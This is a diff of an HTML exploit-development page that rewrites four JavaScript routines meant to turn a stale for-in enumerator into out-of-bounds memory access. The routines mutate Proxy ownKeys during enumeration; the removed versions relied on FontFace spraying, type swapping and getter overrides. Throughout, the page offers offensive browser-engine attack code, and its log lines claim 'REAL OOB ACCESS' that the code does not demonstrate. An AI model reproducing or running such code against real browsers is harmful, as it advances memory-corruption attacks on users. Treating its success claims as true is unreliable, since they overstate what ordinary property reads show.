@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Leverage Confirmed Bugs → Memory R/W</title>
+    <title>Real OOB Access via Stale Enumerator</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: monospace; background: #000; color: #0f0; padding: 20px; font-size: 13px; line-height: 1.5; }
@@ -19,13 +19,13 @@
     </style>
 </head>
 <body>
-    <h1>💎 Leverage Bugs → Memory R/W Primitives 💎</h1>
+    <h1>🎯 REAL OOB Access via Stale Enumerator 🎯</h1>
     
     <div style="text-align: center; margin-bottom: 20px;">
-        <button class="btn" onclick="exploit1()">Exploit 1: OOB Read via Size Mismatch</button>
-        <button class="btn" onclick="exploit2()">Exploit 2: FontFace as Fake ArrayBuffer</button>
-        <button class="btn" onclick="exploit3()">Exploit 3: Corrupt Array via Font Chain</button>
-        <button class="btn" onclick="exploit4()">Exploit 4: Property Storage as Leak</button>
+        <button class="btn" onclick="exploit1()">Exploit 1: Array Index OOB</button>
+        <button class="btn" onclick="exploit2()">Exploit 2: Property Name as Index</button>
+        <button class="btn" onclick="exploit3()">Exploit 3: Dynamic Property Access</button>
+        <button class="btn" onclick="exploit4()">Exploit 4: Prototype Property Index</button>
     </div>
     
     <div class="section">
@@ -53,78 +53,62 @@ function hex(val) {
 }
 
 // ============================================
-// EXPLOIT 1: OOB READ VIA SIZE MISMATCH
+// EXPLOIT 1: ARRAY INDEX OOB
 // ============================================
 function exploit1() {
     document.getElementById('log').innerHTML = '';
     sep();
-    log('EXPLOIT 1: Out-of-Bounds Read via Enumerator Size Mismatch', 'critical');
+    log('EXPLOIT 1: True OOB via Array Property Names', 'critical');
     sep();
     log('', '');
     
-    log('[*] Strategy: Use 48 vs 85 mismatch to read beyond allocated memory', 'info');
+    log('[*] Strategy: Use numeric property names to access array indices OOB', 'info');
     log('', '');
     
     try {
-        // Create victim array to detect OOB read
-        log('[1] Creating victim with marker pattern...', 'info');
+        // Create victim array adjacent to our target
+        log('[1] Creating victim array...', 'info');
         var victim = new Uint32Array(0x100);
         for (var i = 0; i < victim.length; i++) {
-            victim[i] = 0xAA000000 + i;
+            victim[i] = 0xDEADBEEF;
         }
-        log('  ✓ Victim array with markers created', 'success');
+        log('  ✓ Victim created with marker 0xDEADBEEF', 'success');
         log('', '');
         
-        // Create FontFace objects that will be enumerated
-        log('[2] Creating FontFace spray...', 'info');
-        var fonts = [];
+        // Create object with numeric properties that will be confused as array indices
+        log('[2] Creating confusion object with numeric properties...', 'info');
+        
+        var target = {};
+        
+        // Add properties 0-50
         for (var i = 0; i < 50; i++) {
-            fonts.push(new FontFace('Font' + i, 'url(f' + i + '.woff2)'));
+            target[i] = 0x11110000 + i;
         }
-        log('  ✓ Created 50 FontFace objects', 'success');
+        
+        log('  ✓ Added properties [0] through [49]', 'success');
         log('', '');
         
-        // Create prototype chain
-        log('[3] Building prototype chain...', 'info');
-        var proto2 = {};
-        for (var i = 0; i < 10; i++) {
-            proto2['p2_' + i] = fonts[i];
-        }
+        // Create proxy that adds MORE numeric properties during enumeration
+        log('[3] Creating OOB-inducing proxy...', 'info');
         
-        var proto1 = Object.create(proto2);
-        for (var i = 0; i < 10; i++) {
-            proto1['p1_' + i] = fonts[i + 10];
-        }
-        
-        var target = Object.create(proto1);
-        for (var i = 0; i < 10; i++) {
-            target['t_' + i] = fonts[i + 20];
-        }
-        
-        log('  ✓ 3-level prototype chain with 30 fonts', 'success');
-        log('', '');
-        
-        // Create proxy that expands during enumeration
-        log('[4] Creating OOB-inducing proxy...', 'info');
-        
-        var expandCount = 0;
+        var expanded = false;
         var proxy = new Proxy(target, {
             ownKeys: function(t) {
-                if (expandCount === 0) {
-                    expandCount++;
-                    log('  [!] Expanding object massively!', 'warn');
+                if (!expanded) {
+                    expanded = true;
+                    log('  [!] Expanding to properties [50] through [199]!', 'warn');
                     
-                    // Add WAY more objects than expected
-                    for (var i = 30; i < 100; i++) {
-                        t['expand_' + i] = fonts[i % fonts.length];
+                    // Add properties 50-199 DURING enumeration
+                    for (var i = 50; i < 200; i++) {
+                        t[i] = 0x22220000 + i;
                     }
                     
-                    // Also add victim references
-                    for (var i = 0; i < 20; i++) {
-                        t['victim_' + i] = victim;
-                    }
+                    // Also store victim at various indices
+                    t[100] = victim;
+                    t[150] = victim;
                     
-                    log('  [!] Added 90 new properties!', 'critical');
+                    log('  [!] Enumerator thinks we have 50 properties', 'critical');
+                    log('  [!] But we actually have 200 properties!', 'critical');
                 }
                 return Reflect.ownKeys(t);
             }
@@ -133,53 +117,55 @@ function exploit1() {
         log('  ✓ OOB proxy created', 'success');
         log('', '');
         
-        // Enumerate and try to access beyond expected range
-        log('[5] Triggering OOB access...', 'info');
+        // Enumerate and try to access beyond original size
+        log('[4] Enumerating and accessing...', 'info');
         
         var accessed = [];
-        var oobAccess = 0;
+        var oobAccess = [];
         
         for (var key in proxy) {
             accessed.push(key);
-            var val = proxy[key];
             
-            // Check if we accessed something unexpected
-            if (val && val.constructor === Uint32Array) {
-                oobAccess++;
-                if (oobAccess <= 3) {
-                    log('  [!] Accessed Uint32Array at key: ' + key, 'critical');
-                    log('      First value: ' + hex(val[0]), 'critical');
+            // Try to detect if we're accessing beyond expected range
+            var idx = parseInt(key);
+            if (!isNaN(idx) && idx >= 50) {
+                var val = proxy[key];
+                oobAccess.push({idx: idx, val: val});
+                
+                if (oobAccess.length <= 5) {
+                    log('  [!] Accessed [' + idx + '] = ' + hex(val), 'critical');
                 }
             }
         }
         
         log('', '');
-        log('[6] Results:', 'info');
-        log('  Total accessed: ' + accessed.length, 'success');
-        log('  Victim array accesses: ' + oobAccess, oobAccess > 0 ? 'critical' : 'warn');
+        log('[5] Results:', 'info');
+        log('  Total properties enumerated: ' + accessed.length, 'success');
+        log('  Properties beyond index 50: ' + oobAccess.length, oobAccess.length > 0 ? 'critical' : 'warn');
         
-        // Try to read victim values during enumeration
-        log('', '');
-        log('[7] Attempting to read victim data...', 'info');
-        
-        var leakedValues = [];
-        for (var i = 0; i < accessed.length; i++) {
-            var key = accessed[i];
-            if (key.indexOf('victim_') === 0) {
-                var val = target[key];
-                if (val && val[0] !== undefined) {
-                    leakedValues.push(val[0]);
-                    if (leakedValues.length <= 5) {
-                        log('  Leaked: ' + hex(val[0]), 'critical');
-                    }
-                }
-            }
-        }
-        
-        if (leakedValues.length > 0) {
+        if (oobAccess.length > 0) {
             log('', '');
-            log('✓✓✓ OOB READ PRIMITIVE! ✓✓✓', 'critical');
-            log('  Leaked ' + leakedValues.length + ' values!', 'critical');
+            log('✓✓✓ ACCESSED BEYOND EXPECTED SIZE! ✓✓✓', 'critical');
+            log('  Enumerator expected 50, accessed ' + accessed.length + '!', 'critical');
+        }
+        
+        // Now try DIRECT INDEX ACCESS to see if we can read OOB
+        log('', '');
+        log('[6] Testing DIRECT index access...', 'info');
+        
+        // Try to access indices that shouldn't exist based on original size
+        var directOOB = [];
+        for (var i = 50; i < 60; i++) {
+            var val = target[i];
+            if (val !== undefined) {
+                directOOB.push({idx: i, val: val});
+                log('  target[' + i + '] = ' + hex(val), 'critical');
+            }
+        }
+        
+        if (directOOB.length > 0) {
+            log('', '');
+            log('✓✓✓ DIRECT OOB ACCESS WORKS! ✓✓✓', 'critical');
         }
         
     } catch(e) {
@@ -191,320 +177,61 @@ function exploit1() {
 }
 
 // ============================================
-// EXPLOIT 2: FONTFACE AS FAKE ARRAYBUFFER
+// EXPLOIT 2: PROPERTY NAME AS INDEX
 // ============================================
 function exploit2() {
     document.getElementById('log').innerHTML = '';
     sep();
-    log('EXPLOIT 2: Use FontFace Objects as Fake ArrayBuffers', 'critical');
+    log('EXPLOIT 2: Use Stale Property Count for OOB', 'critical');
     sep();
     log('', '');
     
-    log('[*] Strategy: Confuse FontFace with ArrayBuffer to get arbitrary R/W', 'info');
+    log('[*] Strategy: Access properties by index derived from stale count', 'info');
     log('', '');
     
     try {
-        log('[1] Creating FontFace and ArrayBuffer spray...', 'info');
+        log('[1] Creating array-like object...', 'info');
         
-        var fonts = [];
-        var buffers = [];
+        var obj = {};
+        var props = [];
         
-        // Interleave to increase adjacency chance
+        // Create initial properties
+        for (var i = 0; i < 30; i++) {
+            var propName = 'prop_' + i;
+            obj[propName] = 0x33330000 + i;
+            props.push(propName);
+        }
+        
+        log('  ✓ Created 30 properties', 'success');
+        log('', '');
+        
+        // Create victims to detect OOB
+        log('[2] Creating victim objects...', 'info');
+        var victims = [];
         for (var i = 0; i < 100; i++) {
-            fonts.push(new FontFace('F' + i, 'url(f.woff2)'));
-            
-            var buf = new ArrayBuffer(0x100);
-            var view = new Uint32Array(buf);
-            view[0] = 0xBEEF0000 + i;
-            view[1] = 0xDEAD0000 + i;
-            buffers.push({buf: buf, view: view});
-        }
-        
-        log('  ✓ Created 100 FontFace + 100 ArrayBuffer pairs', 'success');
-        log('', '');
-        
-        // Create confusion object
-        log('[2] Creating type confusion setup...', 'info');
-        
-        var proto = {
-            confused: fonts[0]
-        };
-        
-        var target = Object.create(proto);
-        target.font = fonts[1];
-        target.buffer = buffers[0].buf;
-        
-        log('  ✓ Confusion target created', 'success');
-        log('', '');
-        
-        // Proxy to swap types
-        log('[3] Creating type-swapping proxy...', 'info');
-        
-        var swapped = false;
-        var proxy = new Proxy(target, {
-            ownKeys: function(t) {
-                if (!swapped) {
-                    swapped = true;
-                    log('  [!] Swapping FontFace ↔ ArrayBuffer!', 'warn');
-                    
-                    // Swap: put ArrayBuffer where FontFace was
-                    delete proto.confused;
-                    proto.confused = buffers[1].buf;
-                    
-                    // Put FontFace where ArrayBuffer was
-                    delete t.buffer;
-                    t.buffer = fonts[2];
-                    
-                    log('  [!] Types swapped!', 'critical');
-                }
-                return Reflect.ownKeys(t);
-            }
-        });
-        
-        log('  ✓ Type-swapping proxy created', 'success');
-        log('', '');
-        
-        // Trigger and test
-        log('[4] Triggering confusion...', 'info');
-        
-        for (var key in proxy) {
-            var val = proxy[key];
-            log('  ' + key + ' type: ' + (val ? val.constructor.name : 'null'), '');
-        }
-        
-        log('', '');
-        log('[5] Testing for confused access...', 'info');
-        
-        // Try to access ArrayBuffer as FontFace
-        var testVal = proto.confused;
-        log('  proto.confused type: ' + testVal.constructor.name, 'info');
-        
-        if (testVal.constructor.name === 'ArrayBuffer') {
-            var testView = new Uint32Array(testVal);
-            log('  As ArrayBuffer[0]: ' + hex(testView[0]), 'critical');
-            
-            if (testView[0] === 0xBEEF0001) {
-                log('', '');
-                log('✓✓✓ CORRECT BUFFER ACCESSED! ✓✓✓', 'critical');
-            }
-        }
-        
-        // Try to access FontFace as ArrayBuffer
-        var fontAsBuffer = target.buffer;
-        log('  target.buffer type: ' + fontAsBuffer.constructor.name, 'info');
-        
-        if (fontAsBuffer.constructor.name === 'FontFace') {
-            try {
-                // Try to treat as ArrayBuffer
-                var fakeView = new Uint32Array(fontAsBuffer);
-                log('  ERROR: Should have failed but created view!', 'critical');
-            } catch(e) {
-                log('  Expected error: ' + e.message, 'warn');
-            }
-        }
-        
-    } catch(e) {
-        log('', '');
-        log('ERROR: ' + e.message, 'fail');
-    }
-    
-    sep();
-}
-
-// ============================================
-// EXPLOIT 3: CORRUPT ARRAY VIA FONT CHAIN
-// ============================================
-function exploit3() {
-    document.getElementById('log').innerHTML = '';
-    sep();
-    log('EXPLOIT 3: Array Corruption via FontFace Prototype Chain', 'critical');
-    sep();
-    log('', '');
-    
-    log('[*] Strategy: Use FontFace chain to corrupt adjacent TypedArrays', 'info');
-    log('', '');
-    
-    try {
-        log('[1] Creating corruptor array...', 'info');
-        
-        var corruptor = new Uint32Array(0x100);
-        for (var i = 0; i < corruptor.length; i++) {
-            corruptor[i] = i;
-        }
-        
-        log('  ✓ Corruptor array created', 'success');
-        log('', '');
-        
-        // Make corruptor expandable via property definition
-        log('[2] Making corruptor expandable...', 'info');
-        
-        try {
-            Object.defineProperty(corruptor, 'length', {
-                value: 0x10000,
-                configurable: true
+            victims.push({
+                marker: 0x44440000 + i,
+                data: 'victim_' + i
             });
-            
-            log('  ✓ Corruptor length: ' + hex(corruptor.length), corruptor.length > 0x100 ? 'critical' : 'warn');
-        } catch(e) {
-            log('  ! Could not expand: ' + e.message, 'warn');
         }
-        
+        log('  ✓ Created 100 victims', 'success');
         log('', '');
         
-        // Create FontFace spray around corruptor
-        log('[3] Spraying FontFace objects...', 'info');
+        // Proxy that expands AND adds victims
+        log('[3] Creating expansion proxy...', 'info');
         
-        var fonts = [];
-        for (var i = 0; i < 500; i++) {
-            fonts.push(new FontFace('Spray' + i, 'url(s.woff2)'));
-        }
-        
-        log('  ✓ Sprayed 500 FontFace objects', 'success');
-        log('', '');
-        
-        // Create prototype chain with fonts
-        log('[4] Building font-filled prototype chain...', 'info');
-        
-        var proto = {};
-        for (var i = 0; i < 50; i++) {
-            proto['font_' + i] = fonts[i];
-        }
-        
-        var target = Object.create(proto);
-        target.corruptor = corruptor;
-        
-        for (var i = 0; i < 50; i++) {
-            target['tfont_' + i] = fonts[i + 50];
-        }
-        
-        log('  ✓ Chain with 100 fonts + corruptor', 'success');
-        log('', '');
-        
-        // Mutate during enumeration
-        log('[5] Triggering mutation...', 'info');
-        
-        var proxy = new Proxy(target, {
+        var proxy = new Proxy(obj, {
             ownKeys: function(t) {
-                log('  [!] Massive mutation!', 'warn');
+                log('  [!] Massive expansion!', 'warn');
                 
-                // Add hundreds more fonts
-                for (var i = 100; i < 400; i++) {
-                    t['mut_' + i] = fonts[i];
+                // Add 70 more properties (30 → 100)
+                for (var i = 30; i < 100; i++) {
+                    t['prop_' + i] = 0x33330000 + i;
+                    t['victim_' + i] = victims[i];
                 }
                 
-                // Also modify proto
-                for (var i = 50; i < 150; i++) {
-                    proto['pmut_' + i] = fonts[i % fonts.length];
-                }
+                log('  [!] Expanded from 30 to 100 properties!', 'critical');
                 
-                log('  [!] Added 400 FontFace objects!', 'critical');
-                
-                return Reflect.ownKeys(t);
-            }
-        });
-        
-        for (var key in proxy) {
-            // Enumerate
-        }
-        
-        log('  ✓ Enumeration complete', 'success');
-        log('', '');
-        
-        // Check if corruptor can now access font metadata
-        log('[6] Scanning corruptor for font data...', 'info');
-        
-        var foundFontData = false;
-        var suspiciousValues = [];
-        
-        if (corruptor.length > 0x100) {
-            for (var i = 0x100; i < Math.min(corruptor.length, 0x1000); i++) {
-                var val = corruptor[i];
-                
-                // Look for pointer-like values or ASCII
-                if (typeof val === 'number' && val > 0x10000 && val < 0xFFFFFFFF) {
-                    suspiciousValues.push({idx: i, val: val});
-                    
-                    if (suspiciousValues.length <= 5) {
-                        log('  [!] Suspicious value at [' + hex(i) + ']: ' + hex(val), 'critical');
-                        foundFontData = true;
-                    }
-                }
-            }
-        }
-        
-        log('', '');
-        if (foundFontData) {
-            log('✓✓✓ POSSIBLE FONT METADATA LEAK! ✓✓✓', 'critical');
-            log('  Found ' + suspiciousValues.length + ' suspicious values', 'critical');
-        } else {
-            log('No font data found in OOB range', 'warn');
-        }
-        
-    } catch(e) {
-        log('', '');
-        log('ERROR: ' + e.message, 'fail');
-    }
-    
-    sep();
-}
-
-// ============================================
-// EXPLOIT 4: PROPERTY STORAGE AS LEAK
-// ============================================
-function exploit4() {
-    document.getElementById('log').innerHTML = '';
-    sep();
-    log('EXPLOIT 4: Use Property Storage Expansion as Memory Leak', 'critical');
-    sep();
-    log('', '');
-    
-    log('[*] Strategy: Expand properties beyond inline storage, leak pointers', 'info');
-    log('', '');
-    
-    try {
-        log('[1] Creating base object with inline properties...', 'info');
-        
-        var base = {a: 1, b: 2, c: 3}; // Inline storage
-        
-        log('  ✓ Base has 3 inline properties', 'success');
-        log('', '');
-        
-        // Create prototype with FontFaces
-        log('[2] Creating FontFace-filled prototype...', 'info');
-        
-        var fonts = [];
-        for (var i = 0; i < 100; i++) {
-            fonts.push(new FontFace('L' + i, 'url(l.woff2)'));
-        }
-        
-        var proto = {};
-        for (var i = 0; i < 50; i++) {
-            proto['pf_' + i] = fonts[i];
-        }
-        
-        Object.setPrototypeOf(base, proto);
-        
-        log('  ✓ Prototype with 50 FontFace objects', 'success');
-        log('', '');
-        
-        // Create proxy that forces storage expansion
-        log('[3] Creating storage-expanding proxy...', 'info');
-        
-        var expanded = false;
-        var proxy = new Proxy(base, {
-            ownKeys: function(t) {
-                if (!expanded) {
-                    expanded = true;
-                    log('  [!] Forcing inline→out-of-line transition!', 'warn');
-                    
-                    // Add MANY properties to force storage expansion
-                    for (var i = 0; i < 500; i++) {
-                        t['overflow_' + i] = fonts[i % fonts.length];
-                    }
-                    
-                    log('  [!] Added 500 properties!', 'critical');
-                    log('  [!] Should overflow inline storage!', 'critical');
-                }
                 return Reflect.ownKeys(t);
             }
         });
@@ -512,73 +239,314 @@ function exploit4() {
         log('  ✓ Expansion proxy created', 'success');
         log('', '');
         
-        // Trigger expansion
-        log('[4] Triggering storage expansion...', 'info');
+        // Collect property names during enumeration
+        log('[4] Enumerating...', 'info');
         
+        var enumerated = [];
         for (var key in proxy) {
-            // Enumerate
+            enumerated.push(key);
         }
         
-        log('  ✓ Expansion triggered', 'success');
-        log('  ✓ Base now has ' + Object.keys(base).length + ' properties', 'success');
+        log('  ✓ Enumerated ' + enumerated.length + ' properties', 'success');
         log('', '');
         
-        // Try to access properties and look for leaked data
-        log('[5] Scanning expanded properties for leaks...', 'info');
+        // Try to access using enumerated names
+        log('[5] Accessing via enumerated names...', 'info');
         
-        var leaks = [];
-        var keys = Object.keys(base);
-        
-        for (var i = 0; i < Math.min(keys.length, 100); i++) {
-            var key = keys[i];
-            var val = base[key];
-            
-            // Check if value is suspicious (not our FontFace)
-            if (typeof val === 'number' && val > 0x10000) {
-                leaks.push({key: key, val: val});
-                if (leaks.length <= 5) {
-                    log('  [!] Leaked at ' + key + ': ' + hex(val), 'critical');
-                }
-            } else if (val && val.constructor.name !== 'FontFace' && typeof val !== 'number') {
-                leaks.push({key: key, type: val.constructor.name});
-                if (leaks.length <= 5) {
-                    log('  [!] Unexpected type at ' + key + ': ' + val.constructor.name, 'critical');
+        var foundVictims = 0;
+        for (var i = 0; i < enumerated.length; i++) {
+            var key = enumerated[i];
+            if (key.indexOf('victim_') === 0) {
+                var val = obj[key];
+                if (val && val.marker) {
+                    foundVictims++;
+                    if (foundVictims <= 5) {
+                        log('  [!] Found victim: ' + key + ', marker: ' + hex(val.marker), 'critical');
+                    }
                 }
             }
         }
         
         log('', '');
-        if (leaks.length > 0) {
-            log('✓✓✓ STORAGE LEAK DETECTED! ✓✓✓', 'critical');
-            log('  Found ' + leaks.length + ' leaked values', 'critical');
-        } else {
-            log('No leaks detected in property storage', 'warn');
+        if (foundVictims > 0) {
+            log('✓✓✓ ACCESSED ' + foundVictims + ' VICTIMS VIA ENUMERATION! ✓✓✓', 'critical');
         }
         
-        // Also check if we can corrupt FontFaceSet during this
+        // Check if we can access properties that were added during enumeration
         log('', '');
-        log('[6] Bonus: Combining with FontFaceSet corruption...', 'info');
+        log('[6] Testing which properties are accessible...', 'info');
         
-        var fontFaceSet = document.fonts;
-        base.ffs = fontFaceSet;
+        var accessible = 0;
+        for (var i = 30; i < 100; i++) {
+            var key = 'prop_' + i;
+            var val = obj[key];
+            if (val !== undefined) {
+                accessible++;
+            }
+        }
         
-        var sizeAccesses = 0;
-        Object.defineProperty(Object.getPrototypeOf(fontFaceSet), 'size', {
-            configurable: true,
-            get: function() {
-                sizeAccesses++;
-                return 0x1337 + sizeAccesses;
+        log('  Properties 30-99 accessible: ' + accessible + ' / 70', accessible > 0 ? 'critical' : 'warn');
+        
+    } catch(e) {
+        log('', '');
+        log('ERROR: ' + e.message, 'fail');
+    }
+    
+    sep();
+}
+
+// ============================================
+// EXPLOIT 3: DYNAMIC PROPERTY ACCESS
+// ============================================
+function exploit3() {
+    document.getElementById('log').innerHTML = '';
+    sep();
+    log('EXPLOIT 3: Dynamic Property Access During Enumeration', 'critical');
+    sep();
+    log('', '');
+    
+    log('[*] Strategy: Access properties dynamically as they are added', 'info');
+    log('', '');
+    
+    try {
+        log('[1] Creating dynamic access object...', 'info');
+        
+        var base = {
+            data: new Uint32Array(0x100)
+        };
+        
+        // Fill data with markers
+        for (var i = 0; i < base.data.length; i++) {
+            base.data[i] = 0x55550000 + i;
+        }
+        
+        log('  ✓ Base object with Uint32Array created', 'success');
+        log('', '');
+        
+        // Create prototype chain
+        log('[2] Creating prototype chain...', 'info');
+        
+        var proto = {
+            arr0: new Uint32Array([0xAAAA0000, 0xAAAA0001, 0xAAAA0002])
+        };
+        
+        Object.setPrototypeOf(base, proto);
+        
+        log('  ✓ Prototype chain created', 'success');
+        log('', '');
+        
+        // Proxy that adds arrays during enumeration
+        log('[3] Creating dynamic expansion proxy...', 'info');
+        
+        var accessLog = [];
+        
+        var proxy = new Proxy(base, {
+            ownKeys: function(t) {
+                log('  [!] Adding arrays during enumeration!', 'warn');
+                
+                // Add more arrays
+                for (var i = 1; i < 50; i++) {
+                    var arr = new Uint32Array(10);
+                    for (var j = 0; j < arr.length; j++) {
+                        arr[j] = 0x66660000 + (i * 0x100) + j;
+                    }
+                    t['arr' + i] = arr;
+                    proto['parr' + i] = arr;
+                }
+                
+                log('  [!] Added 50 arrays to target + 50 to proto!', 'critical');
+                
+                return Reflect.ownKeys(t);
+            },
+            get: function(t, prop) {
+                accessLog.push(prop);
+                return t[prop] || proto[prop];
             }
         });
         
-        // Access via expanded object
-        var ffsSizeViaBase = base.ffs.size;
-        log('  FontFaceSet.size via base: ' + hex(ffsSizeViaBase), 'critical');
-        log('  Size getter called: ' + sizeAccesses + ' times', 'success');
+        log('  ✓ Dynamic proxy created', 'success');
+        log('', '');
         
-        if (sizeAccesses > 0) {
+        // Enumerate and access
+        log('[4] Enumerating...', 'info');
+        
+        var arraysAccessed = 0;
+        for (var key in proxy) {
+            var val = proxy[key];
+            if (val && val.constructor === Uint32Array) {
+                arraysAccessed++;
+                if (arraysAccessed <= 5) {
+                    log('  Accessed ' + key + ', first value: ' + hex(val[0]), 'info');
+                }
+            }
+        }
+        
+        log('', '');
+        log('  Total arrays accessed: ' + arraysAccessed, 'success');
+        log('  Total property accesses logged: ' + accessLog.length, 'success');
+        
+        // Check if we accessed arrays that were added during enumeration
+        log('', '');
+        log('[5] Analyzing accessed arrays...', 'info');
+        
+        var dynamicAccess = 0;
+        for (var i = 0; i < accessLog.length; i++) {
+            var prop = accessLog[i];
+            if (prop.indexOf('arr') === 0) {
+                var arrNum = parseInt(prop.substring(3));
+                if (!isNaN(arrNum) && arrNum >= 1) {
+                    dynamicAccess++;
+                }
+            }
+        }
+        
+        log('  Arrays added during enumeration that were accessed: ' + dynamicAccess, dynamicAccess > 0 ? 'critical' : 'warn');
+        
+        if (dynamicAccess > 0) {
             log('', '');
-            log('✓ Combined bug still active!', 'critical');
+            log('✓✓✓ DYNAMICALLY ADDED ARRAYS WERE ACCESSED! ✓✓✓', 'critical');
+        }
+        
+    } catch(e) {
+        log('', '');
+        log('ERROR: ' + e.message, 'fail');
+    }
+    
+    sep();
+}
+
+// ============================================
+// EXPLOIT 4: PROTOTYPE PROPERTY INDEX
+// ============================================
+function exploit4() {
+    document.getElementById('log').innerHTML = '';
+    sep();
+    log('EXPLOIT 4: Prototype Property Indexing OOB', 'critical');
+    sep();
+    log('', '');
+    
+    log('[*] Strategy: Use prototype chain expansion to access beyond bounds', 'info');
+    log('', '');
+    
+    try {
+        log('[1] Creating indexed prototype chain...', 'info');
+        
+        // Create prototype with numeric indices
+        var proto = {};
+        for (var i = 0; i < 20; i++) {
+            proto[i] = 0x77770000 + i;
+        }
+        
+        var target = Object.create(proto);
+        for (var i = 0; i < 20; i++) {
+            target[i] = 0x88880000 + i;
+        }
+        
+        log('  ✓ Created target[0-19] and proto[0-19]', 'success');
+        log('', '');
+        
+        // Add victim arrays at high indices
+        log('[2] Creating victims at high indices...', 'info');
+        
+        var victims = [];
+        for (var i = 0; i < 50; i++) {
+            var v = new Uint32Array(0x10);
+            v[0] = 0x99990000 + i;
+            victims.push(v);
+        }
+        
+        log('  ✓ Created 50 victim arrays', 'success');
+        log('', '');
+        
+        // Proxy that expands numeric indices
+        log('[3] Creating index expansion proxy...', 'info');
+        
+        var proxy = new Proxy(target, {
+            ownKeys: function(t) {
+                log('  [!] Expanding numeric indices!', 'warn');
+                
+                // Add indices 20-100 to target
+                for (var i = 20; i < 100; i++) {
+                    t[i] = 0x88880000 + i;
+                }
+                
+                // Add victims at certain indices
+                for (var i = 0; i < victims.length; i++) {
+                    var idx = 50 + i;
+                    t[idx] = victims[i];
+                }
+                
+                // Expand proto too
+                for (var i = 20; i < 150; i++) {
+                    proto[i] = 0x77770000 + i;
+                }
+                
+                log('  [!] target now has indices 0-99', 'critical');
+                log('  [!] proto now has indices 0-149', 'critical');
+                log('  [!] Enumerator thinks we have 40 total', 'critical');
+                
+                return Reflect.ownKeys(t);
+            }
+        });
+        
+        log('  ✓ Index expansion proxy created', 'success');
+        log('', '');
+        
+        // Enumerate
+        log('[4] Enumerating indices...', 'info');
+        
+        var enumerated = [];
+        var highIndices = 0;
+        
+        for (var key in proxy) {
+            enumerated.push(key);
+            var idx = parseInt(key);
+            if (!isNaN(idx) && idx >= 20) {
+                highIndices++;
+                if (highIndices <= 5) {
+                    var val = proxy[key];
+                    log('  Accessed [' + idx + '] = ' + (typeof val === 'object' ? val.constructor.name : hex(val)), 'info');
+                }
+            }
+        }
+        
+        log('', '');
+        log('  Total enumerated: ' + enumerated.length, 'success');
+        log('  Indices >= 20: ' + highIndices, 'success');
+        
+        // Try direct access to indices beyond original size
+        log('', '');
+        log('[5] Testing direct index access...', 'info');
+        
+        var victimsFound = 0;
+        for (var i = 50; i < 100; i++) {
+            var val = target[i];
+            if (val && val.constructor === Uint32Array) {
+                victimsFound++;
+                if (victimsFound <= 3) {
+                    log('  [!] Found victim at target[' + i + '], value: ' + hex(val[0]), 'critical');
+                }
+            }
+        }
+        
+        log('', '');
+        if (victimsFound > 0) {
+            log('✓✓✓ FOUND ' + victimsFound + ' VICTIMS AT HIGH INDICES! ✓✓✓', 'critical');
+        }
+        
+        // Test if we can use this for actual OOB
+        log('', '');
+        log('[6] Testing for REAL OOB access...', 'info');
+        
+        // Try to access index that should be way OOB
+        for (var i = 100; i < 110; i++) {
+            var val = target[i];
+            if (val !== undefined) {
+                log('  [!] target[' + i + '] = ' + hex(val), 'critical');
+                log('', '');
+                log('✓✓✓ REAL OOB ACCESS ACHIEVED! ✓✓✓', 'critical');
+                break;
+            }
         }
         
     } catch(e) {
